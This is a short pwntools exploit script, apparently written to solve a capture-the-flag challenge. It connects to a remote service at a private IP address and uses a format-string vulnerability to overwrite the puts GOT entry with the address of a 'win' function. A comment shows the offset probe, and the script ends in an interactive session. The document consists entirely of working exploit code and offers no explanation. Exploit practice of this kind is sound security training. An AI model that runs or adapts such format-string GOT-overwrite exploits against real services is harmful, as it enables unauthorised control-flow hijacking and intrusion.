from pwn import *

context.log_level = "debug"

# p = process(b"./notspecified")
p = remote("10.201.117.91", 9009)
e = context.binary = ELF(b"./notspecified")

# win
# 00000000004011f6

win_addr = e.symbols["win"]
info(f"win_addr: {hex(win_addr)}")

# Overwrite puts in GOT with win
puts_got = e.got["puts"]
info(f"puts_got: {hex(puts_got)}")

# Format-string attack:
#   AAAAAAAA%6$p
#   Thanks!
#   AAAAAAAA0x4141414141414141
payload = fmtstr_payload(6, {puts_got: win_addr})
info(f"fmtstr_payload: {payload}")

p.sendline(payload)

p.interactive()
